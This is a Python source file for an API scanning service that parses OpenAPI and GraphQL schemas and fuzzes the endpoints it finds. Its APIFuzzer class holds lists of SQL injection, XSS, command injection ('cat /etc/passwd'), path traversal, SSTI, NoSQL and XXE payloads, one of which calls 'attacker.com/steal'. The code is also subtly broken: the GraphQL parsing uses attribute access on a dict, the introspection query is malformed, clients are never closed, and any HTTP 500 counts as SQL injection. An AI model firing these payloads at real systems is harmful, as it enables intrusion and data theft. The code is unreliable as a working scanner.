"""API scanning service (REST/GraphQL) with OpenAPI/GraphQL schema parser + fuzzer"""
import asyncio
import json
import re
from datetime import datetime
from typing import Dict, Any, List, Optional, Set
from dataclasses import dataclass
from enum import Enum
from urllib.parse import urljoin, urlparse, parse_qs
import httpx

from services.scanner_base import BaseScanner, ScanResult, ScanFinding, ScannerRegistry
from celery import shared_task
from core.database import get_sync_db
from models.finding import FindingSeverity
from sqlalchemy.orm import Session


class APIType(str, Enum):
    REST = "rest"
    GRAPHQL = "graphql"
    SOAP = "soap"
    GRPC = "grpc"


class AuthType(str, Enum):
    NONE = "none"
    API_KEY = "api_key"
    BEARER_TOKEN = "bearer_token"
    BASIC_AUTH = "basic_auth"
    OAUTH2 = "oauth2"
    JWT = "jwt"
    CUSTOM_HEADER = "custom_header"


@dataclass
class APIEndpoint:
    path: str
    method: str
    summary: str
    description: str
    parameters: List[Dict[str, Any]]
    request_body: Optional[Dict[str, Any]]
    responses: Dict[str, Any]
    security: List[Dict[str, Any]]
    tags: List[str]
    deprecated: bool = False


@dataclass
class APISchema:
    api_type: APIType
    base_url: str
    endpoints: List[APIEndpoint]
    info: Dict[str, Any]
    servers: List[Dict[str, Any]]
    security_schemes: Dict[str, Any]
    components: Dict[str, Any]


class OpenAPIParser:
    """Parse OpenAPI 3.0/3.1 specifications"""
    
    @staticmethod
    def parse(spec: Dict[str, Any], base_url: str = "") -> APISchema:
        endpoints = []
        
        paths = spec.get('paths', {})
        components = spec.get('components', {})
        security_schemes = components.get('securitySchemes', {})
        
        for path, path_item in paths.items():
            for method, operation in path_item.items():
                if method.lower() not in ['get', 'post', 'put', 'patch', 'delete', 'head', 'options', 'trace']:
                    continue
                
                endpoint = APIEndpoint(
                    path=path,
                    method=method.upper(),
                    summary=operation.get('summary', ''),
                    description=operation.get('description', ''),
                    parameters=OpenAPIParser._parse_parameters(operation.get('parameters', []), components),
                    request_body=OpenAPIParser._parse_request_body(operation.get('requestBody'), components),
                    responses=operation.get('responses', {}),
                    security=operation.get('security', spec.get('security', [])),
                    tags=operation.get('tags', []),
                    deprecated=operation.get('deprecated', False),
                )
                endpoints.append(endpoint)
        
        return APISchema(
            api_type=APIType.REST,
            base_url=base_url or spec.get('servers', [{}])[0].get('url', ''),
            endpoints=endpoints,
            info=spec.get('info', {}),
            servers=spec.get('servers', []),
            security_schemes=security_schemes,
            components=components,
        )
    
    @staticmethod
    def _parse_parameters(params: List[Dict], components: Dict) -> List[Dict]:
        parsed = []
        for param in params:
            if '$ref' in param:
                ref = param['$ref']
                if ref.startswith('#/components/parameters/'):
                    param_name = ref.split('/')[-1]
                    param = components.get('parameters', {}).get(param_name, {})
            
            parsed.append({
                'name': param.get('name'),
                'in': param.get('in'),  # query, header, path, cookie
                'description': param.get('description', ''),
                'required': param.get('required', False),
                'deprecated': param.get('deprecated', False),
                'schema': param.get('schema', {}),
                'example': param.get('example'),
                'examples': param.get('examples', {}),
            })
        return parsed
    
    @staticmethod
    def _parse_request_body(request_body: Dict, components: Dict) -> Optional[Dict]:
        if not request_body:
            return None
        
        content = request_body.get('content', {})
        for media_type, media_obj in content.items():
            schema = media_obj.get('schema', {})
            if '$ref' in schema:
                ref = schema['$ref']
                if ref.startswith('#/components/schemas/'):
                    schema_name = ref.split('/')[-1]
                    schema = components.get('schemas', {}).get(schema_name, {})
            
            return {
                'content_type': media_type,
                'schema': schema,
                'example': media_obj.get('example'),
                'examples': media_obj.get('examples', {}),
                'required': request_body.get('required', False),
            }
        return None


class GraphQLIntrospectionParser:
    """Parse GraphQL schema via introspection"""
    
    INTROSPECTION_QUERY = """
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          kind
          name
          description
          fields(includeDeprecated: true) {
            name
            description
            args {
              name
              description
              type {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
              type {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
              isDeprecated
              deprecationReason
            }
            inputFields {
              name
              description
              type {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
              defaultValue
            }
            interfaces {
              name
            }
            enumValues(includeDeprecated: true) {
              name
              description
              isDeprecated
              deprecationReason
            }
            possibleTypes {
              name
            }
          }
          directives {
            name
            description
            locations
            args {
              name
              description
              type {
                kind
                name
                ofType {
                  kind
                  name
                }
              }
              defaultValue
            }
          }
        }
      }
    """
    
    @staticmethod
    async def fetch_schema(endpoint: str, headers: Dict[str, str] = None) -> Dict[str, Any]:
        async with httpx.AsyncClient(timeout=30.0) as client:
            resp = await client.post(
                endpoint,
                json={'query': GraphQLIntrospectionParser.INTROSPECTION_QUERY},
                headers=headers or {},
            )
            return resp.json()
    
    @staticmethod
    def parse(introspection: Dict[str, Any], base_url: str) -> APISchema:
        schema_data = introspection.get('data', {}).__schema
        endpoints = []
        
        for type_def in schema_data.get('types', []):
            if type_def['kind'] in ['OBJECT', 'INPUT_OBJECT']:
                if type_def['name'] in ['Query', 'Mutation']:
                    for field in type_def.get('fields', []):
                        endpoint = APIEndpoint(
                            path=field['name'],
                            method='POST',
                            summary=field.get('description', ''),
                            description=field.get('description', ''),
                            parameters=GraphQLIntrospectionParser._parse_args(field.get('args', [])),
                            request_body=GraphQLIntrospectionParser._build_graphql_request_body(type_def['name'], field),
                            responses={},
                            security=[],
                            tags=['graphql', type_def['name'].lower()],
                        )
                        endpoints.append(endpoint)
        
        return APISchema(
            api_type=APIType.GRAPHQL,
            base_url=base_url,
            endpoints=endpoints,
            info={},
            servers=[],
            security_schemes={},
            components={},
        )
    
    @staticmethod
    def _parse_args(args: List[Dict]) -> List[Dict]:
        return [{
            'name': arg['name'],
            'description': arg.get('description', ''),
            'type': GraphQLIntrospectionParser._format_type(arg['type']),
            'default_value': arg.get('defaultValue'),
        } for arg in args]
    
    @staticmethod
    def _format_type(type_def: Dict) -> str:
        if type_def['kind'] == 'NON_NULL':
            return f"{GraphQLIntrospectionParser._format_type(type_def['ofType'])}!"
        elif type_def['kind'] == 'LIST':
            return f"[{GraphQLIntrospectionParser._format_type(type_def['ofType'])}]"
        else:
            return type_def.get('name', 'Unknown')
    
    @staticmethod
    def _build_graphql_request_body(parent_type: str, field: Dict) -> Dict:
        return {
            'content_type': 'application/json',
            'schema': {
                'type': 'object',
                'properties': {
                    'query': {'type': 'string'},
                    'variables': {'type': 'object'},
                    'operationName': {'type': 'string'},
                },
            },
        }


class APIFuzzer:
    """Fuzz API endpoints with various attack payloads"""
    
    # Common attack payloads
    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' UNION SELECT NULL--",
        "'; DROP TABLE users--",
        "1' AND (SELECT COUNT(*) FROM users) > 0--",
    ]
    
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "'\"><script>alert('XSS')</script>",
    ]
    
    COMMAND_INJECTION_PAYLOADS = [
        "; ls",
        "| cat /etc/passwd",
        "`id`",
        "$(id)",
        "&& cat /etc/passwd",
    ]
    
    PATH_TRAVERSAL_PAYLOADS = [
        "../../etc/passwd",
        "..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ]
    
    XXE_PAYLOADS = [
        """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
        """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/steal">]><foo>&xxe;</foo>""",
    ]
    
    SSTI_PAYLOADS = [
        "{{7*7}}",
        "{{config}}",
        "{{self.__class__.__mro__[1].__subclasses__()}}",
        "#{7*7}",
        "${7*7}",
    ]
    
    NO_SQL_INJECTION_PAYLOADS = [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$where": "1==1"}',
        '{"$regex": ".*"}',
    ]
    
    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        self.timeout = self.config.get('timeout', 10)
        self.max_concurrent = self.config.get('max_concurrent', 10)
        self.follow_redirects = self.config.get('follow_redirects', True)
    
    async def fuzz_endpoint(
        self,
        client: httpx.AsyncClient,
        endpoint: APIEndpoint,
        base_url: str,
        auth: Dict[str, Any],
        payload_sets: List[str] = None,
    ) -> List[ScanFinding]:
        """Fuzz a single endpoint"""
        findings = []
        
        if payload_sets is None:
            payload_sets = ['sqli', 'xss', 'cmd', 'path', 'xxe', 'ssti', 'nosql']
        
        # Build full URL
        full_url = urljoin(base_url, endpoint.path)
        
        # Prepare headers
        headers = self._build_headers(auth, endpoint.security)
        
        # Test each parameter location
        param_locations = self._get_param_locations(endpoint)
        
        for location, params in param_locations.items():
            for param in params:
                param_name = param['name']
                
                for payload_type in payload_sets:
                    payloads = self._get_payloads(payload_type)
                    
                    for payload in payloads[:3]:  # Limit to first 3 payloads per type
                        finding = await self._test_payload(
                            client=httpx.AsyncClient(timeout=self.timeout),
                            method=endpoint.method,
                            url=full_url,
                            location=location,
                            param_name=param_name,
                            payload=payload,
                            payload_type=payload_type,
                            headers=headers,
                            endpoint=endpoint,
                        )
                        if finding:
                            yield finding
    
    def _build_headers(self, auth: Dict, security: List[Dict]) -> Dict[str, str]:
        headers = {'User-Agent': 'Syl-Pentools API Fuzzer'}
        
        # Apply authentication
        if auth.get('type') == AuthType.API_KEY:
            headers[auth['header']] = auth['value']
        elif auth.get('type') == AuthType.BEARER_TOKEN:
            headers['Authorization'] = f"Bearer {auth['token']}"
        elif auth.get('type') == AuthType.BASIC_AUTH:
            import base64
            creds = base64.b64encode(f"{auth['username']}:{auth['password']}".encode()).decode()
            headers['Authorization'] = f"Basic {creds}"
        elif auth.get('type') == AuthType.CUSTOM_HEADER:
            headers[auth['header']] = auth['value']
        
        return headers
    
    def _get_param_locations(self, endpoint: APIEndpoint) -> Dict[str, List[Dict]]:
        locations = {
            'query': [],
            'header': [],
            'path': [],
            'cookie': [],
            'body': [],
        }
        
        for param in endpoint.parameters:
            param_in = param.get('in', 'query')
            if param_in in locations:
                locations[param_in].append(param)
        
        # Add body parameters if request body exists
        if endpoint.request_body:
            locations['body'].append({
                'name': 'body',
                'schema': endpoint.request_body.get('schema', {}),
            })
        
        return locations
    
    def _get_payloads(self, payload_type: str) -> List[str]:
        payload_map = {
            'sqli': self.SQLI_PAYLOADS,
            'xss': self.XSS_PAYLOADS,
            'cmd': self.COMMAND_INJECTION_PAYLOADS,
            'path': self.PATH_TRAVERSAL_PAYLOADS,
            'xxe': self.XXE_PAYLOADS,
            'ssti': self.SSTI_PAYLOADS,
            'nosql': self.NO_SQL_INJECTION_PAYLOADS,
        }
        return payload_map.get(payload_type, [])
    
    async def _test_payload(
        self,
        client: httpx.AsyncClient,
        method: str,
        url: str,
        location: str,
        param_name: str,
        payload: str,
        payload_type: str,
        headers: Dict[str, str],
        endpoint: APIEndpoint,
    ) -> Optional[ScanFinding]:
        """Test a single payload against an endpoint"""
        try:
            # Prepare request
            request_kwargs = {
                'method': method,
                'url': url,
                'headers': headers,
            }
            
            if location == 'query':
                request_kwargs['params'] = {param_name: payload}
            elif location == 'header':
                request_kwargs['headers'] = {**headers, param_name: payload}
            elif location == 'cookie':
                request_kwargs['cookies'] = {param_name: payload}
            elif location == 'body':
                request_kwargs['json'] = {param_name: payload}
            elif location == 'path':
                # Replace path parameter
                url = url.replace(f'{{{param_name}}}', payload)
                request_kwargs['url'] = url
            
            response = await client.request(**request_kwargs)
            
            # Check for successful exploitation
            finding = self._analyze_response(
                response=response,
                payload=payload,
                payload_type=payload_type,
                url=url,
                method=method,
                endpoint=endpoint,
            )
            
            return finding
            
        except Exception as e:
            return None
    
    def _analyze_response(
        self,
        response: httpx.Response,
        payload: str,
        payload_type: str,
        url: str,
        method: str,
        endpoint: APIEndpoint,
    ) -> Optional[ScanFinding]:
        """Analyze response for successful exploitation"""
        
        # Check for error messages, stack traces, etc.
        content = response.text
        status = response.status_code
        
        # SQL Injection detection
        if payload_type == 'sqli':
            sql_errors = [
                'sql syntax', 'mysql_fetch', 'ora-01756', 'odbc drivers',
                'postgresql', 'sqlite3', 'microsoft ole db', 'odbc sql server',
                'unclosed quotation mark', 'quoted string not properly terminated',
            ]
            if any(err in content.lower() for err in sql_errors) or status == 500:
                return self._create_finding(
                    title=f"SQL Injection in {endpoint.method} {endpoint.path}",
                    payload=payload,
                    payload_type=payload_type,
                    severity='high',
                    evidence={'response_snippet': content[:500], 'status_code': status},
                    endpoint=endpoint,
                )
        
        # XSS detection
        elif payload_type == 'xss':
            if payload in content and '<script>' in payload:
                return self._create_finding(
                    title=f"Reflected XSS in {endpoint.method} {endpoint.path}",
                    payload=payload,
                    payload_type=payload_type,
                    severity='medium',
                    evidence={'response_snippet': content[:500], 'status_code': status},
                    endpoint=endpoint,
                )
        
        # Command injection
        elif payload_type == 'cmd':
            cmd_indicators = ['root:', 'uid=', 'gid=', 'bin/bash', 'windows\\system32']
            if any(ind in content.lower() for ind in cmd_indicators):
                return self._create_finding(
                    title=f"Command Injection in {endpoint.method} {endpoint.path}",
                    payload=payload,
                    payload_type=payload_type,
                    severity='critical',
                    evidence={'response_snippet': content[:500], 'status_code': status},
                    endpoint=endpoint,
                )
        
        # Path traversal
        elif payload_type == 'path':
            if 'root:' in content or '[boot loader]' in content or 'windows\\system32' in content.lower():
                return self._create_finding(
                    title=f"Path Traversal in {endpoint.method} {endpoint.path}",
                    payload=payload,
                    payload_type=payload_type,
                    severity='high',
                    evidence={'response_snippet': content[:500], 'status_code': status},
                    endpoint=endpoint,
                )
        
        # XXE
        elif payload_type == 'xxe':
            if 'root:' in content or 'daemon:' in content:
                return self._create_finding(
                    title=f"XXE Injection in {endpoint.method} {endpoint.path}",
                    payload=payload,
                    payload_type=payload_type,
                    severity='high',
                    evidence={'response_snippet': content[:500], 'status_code': status},
                    endpoint=endpoint,
                )
        
        # SSTI
        elif payload_type == 'ssti':
            if '49' in content and '7*7' in payload:
                return self._create_finding(
                    title=f"Server-Side Template Injection in {endpoint.method} {endpoint.path}",
                    payload=payload,
                    payload_type=payload_type,
                    severity='critical',
                    evidence={'response_snippet': content[:500], 'status_code': status},
                    endpoint=endpoint,
                )
        
        # NoSQL Injection
        elif payload_type == 'nosql':
            if status == 200 and len(content) > 1000:  # Data leaked
                return self._create_finding(
                    title=f"NoSQL Injection in {endpoint.method} {endpoint.path}",
                    payload=payload,
                    payload_type=payload_type,
                    severity='high',
                    evidence={'response_snippet': content[:500], 'status_code': status},
                    endpoint=endpoint,
                )
        
        return None
    
    def _create_finding(
        self,
        title: str,
        payload: str,
        payload_type: str,
        severity: str,
        evidence: Dict,
        endpoint: APIEndpoint,
    ) -> ScanFinding:
        return ScanFinding(
            title=title,
            description=f"Successfully exploited {payload_type.upper()} vulnerability",
            severity=severity,
            target_url=evidence.get('url', ''),
            parameter=evidence.get('param', ''),
            method=endpoint.method,
            path=endpoint.path,
            evidence={
                'payload_type': payload_type,
                'payload': payload,
                'response_snippet': evidence.get('response_snippet', ''),
                'status_code': evidence.get('status_code'),
            },
            reproduction_steps=f"Send {payload_type.upper()} payload to {endpoint.method} {endpoint.path}",
            proof_of_concept=payload,
            source_scanner="APIFuzzer",
            source_finding_id=f"api_fuzz_{payload_type}_{endpoint.method}_{endpoint.path}",
            source_rule_id=f"api-fuzz-{payload_type}",
            tags=["api", "fuzzing", payload_type],
        )


class APIScanner(BaseScanner):
    """Main API scanner combining schema parsing and fuzzing"""
    
    def __init__(self, config: Dict[str, Any] = None):
        super().__init__(config)
        self.name = "APIScanner"
        self.version = "1.0.0"
        self.fuzzer = APIFuzzer(config.get('fuzzer') if config else None)
    
    def validate_target(self, target: str) -> bool:
        return bool(target and ('http' in target))
    
    async def scan(self, target: str, options: Dict[str, Any]) -> ScanResult:
        scan_id = options.get('scan_id', 'unknown')
        started_at = datetime.utcnow()
        
        all_findings = []
        
        # Parse schema
        schema = await self._parse_schema(target, options)
        
        if not schema.endpoints:
            return ScanResult(
                scan_id=scan_id,
                scanner_name=self.name,
                status='completed',
                findings=[],
                raw_output='No endpoints found',
                started_at=started_at,
                completed_at=datetime.utcnow(),
                duration_seconds=0,
            )
        
        # Prepare auth
        auth = options.get('auth', {'type': 'none'})
        
        # Fuzz endpoints
        async with httpx.AsyncClient(timeout=10.0, follow_redirects=True) as client:
            for endpoint in schema.endpoints:
                if endpoint.deprecated:
                    continue
                
                async for finding in self.fuzzer.fuzz_endpoint(
                    client=client,
                    endpoint=endpoint,
                    base_url=schema.base_url,
                    auth=options.get('auth', {}),
                    payload_sets=options.get('payload_sets'),
                ):
                    all_findings.append(finding)
        
        completed_at = datetime.utcnow()
        duration = int((completed_at - started_at).total_seconds())
        
        return ScanResult(
            scan_id=scan_id,
            scanner_name=self.name,
            status='completed',
            findings=all_findings,
            raw_output=f"Fuzzed {len(schema.endpoints)} endpoints, found {len(all_findings)} vulnerabilities",
            started_at=started_at,
            completed_at=completed_at,
            duration_seconds=duration,
            metadata={
                'target': target,
                'api_type': schema.api_type.value,
                'endpoints_tested': len(schema.endpoints),
                'endpoints': [
                    {'path': e.path, 'method': e.method} for e in schema.endpoints
                ],
            },
        )
    
    async def _parse_schema(self, target: str, options: Dict) -> APISchema:
        """Parse API schema from various sources"""
        
        # Try OpenAPI spec
        if options.get('openapi_url'):
            async with httpx.AsyncClient() as client:
                resp = await client.get(options['openapi_url'])
                spec = resp.json()
                return OpenAPIParser.parse(spec, target)
        
        # Try common OpenAPI paths
        common_paths = ['/openapi.json', '/swagger.json', '/api-docs', '/swagger/v1/swagger.json']
        for path in common_paths:
            try:
                url = urljoin(target, path)
                async with httpx.AsyncClient() as client:
                    resp = await client.get(url)
                    if resp.status_code == 200:
                        spec = resp.json()
                        if 'openapi' in spec or 'swagger' in spec:
                            return OpenAPIParser.parse(spec, target)
            except:
                continue
        
        # Try GraphQL introspection
        graphql_endpoints = ['/graphql', '/api/graphql', '/gql']
        for path in graphql_endpoints:
            try:
                url = urljoin(target, path)
                introspection = await GraphQLIntrospectionParser.fetch_schema(url)
                if 'data' in introspection and '__schema' in introspection['data']:
                    return GraphQLIntrospectionParser.parse(introspection, target)
            except:
                continue
        
        # Fallback: create minimal schema from options
        return APISchema(
            api_type=APIType.REST,
            base_url=target,
            endpoints=options.get('endpoints', []),
            info={},
            servers=[],
            security_schemes={},
            components={},
        )


# Register API scanner
ScannerRegistry.register(APIScanner())


# Celery task
@shared_task(bind=True, max_retries=1)
def run_api_scan_task(self, scan_id: str, scan_config: dict):
    """Run API scan task"""
    async def _run():
        from core.database import get_sync_db
        from models.scan import Scan, ScanStatus, ScanLog
        from models.finding import Finding, FindingSeverity, FindingStatus
        from sqlalchemy.orm import Session
        
        db: Session = next(get_sync_db())
        
        try:
            scan = db.query(Scan).filter(Scan.id == scan_id).first()
            if not scan:
                raise ValueError(f"Scan {scan_id} not found")
            
            scan.status = ScanStatus.RUNNING
            scan.started_at = datetime.utcnow()
            scan.celery_task_id = self.request.id
            db.commit()
            
            scanner = APIScanner()
            result = await scanner.scan(scan.target, {
                'scan_id': str(scan.id),
                'openapi_url': scan_config.get('openapi_url'),
                'auth': scan_config.get('auth', {}),
                'payload_sets': scan_config.get('payload_sets'),
                'endpoints': scan_config.get('endpoints', []),
            })
            
            for finding_data in result.findings:
                finding = Finding(
                    workspace_id=scan.workspace_id,
                    scan_id=scan.id,
                    asset_id=scan.asset_id,
                    title=finding_data.title,
                    description=finding_data.description,
                    severity=FindingSeverity(finding_data.severity),
                    status=FindingStatus.VERIFIED,
                    target_url=finding_data.target_url,
                    parameter=finding_data.parameter,
                    method=finding_data.method,
                    path=finding_data.path,
                    evidence=finding_data.evidence,
                    reproduction_steps=finding_data.reproduction_steps,
                    proof_of_concept=finding_data.proof_of_concept,
                    remediation=finding_data.remediation,
                    references=finding_data.references,
                    fingerprint=f"api_fuzz_{finding_data.source_finding_id}",
                    source_scanner=finding_data.source_scanner,
                    source_finding_id=finding_data.source_finding_id,
                    source_rule_id=finding_data.source_rule_id,
                    tags=finding_data.tags,
                )
                db.add(finding)
            
            scan.findings_count = len(result.findings)
            scan.status = ScanStatus.COMPLETED
            scan.completed_at = datetime.utcnow()
            scan.duration_seconds = int((scan.completed_at - scan.started_at).total_seconds())
            db.commit()
            
            return {'status': 'completed', 'findings': len(result.findings)}
            
        except Exception as e:
            scan = db.query(Scan).filter(Scan.id == scan_id).first()
            if scan:
                scan.status = ScanStatus.FAILED
                scan.error_message = str(e)
                scan.completed_at = datetime.utcnow()
                db.commit()
            raise
    
    return asyncio.run(_run())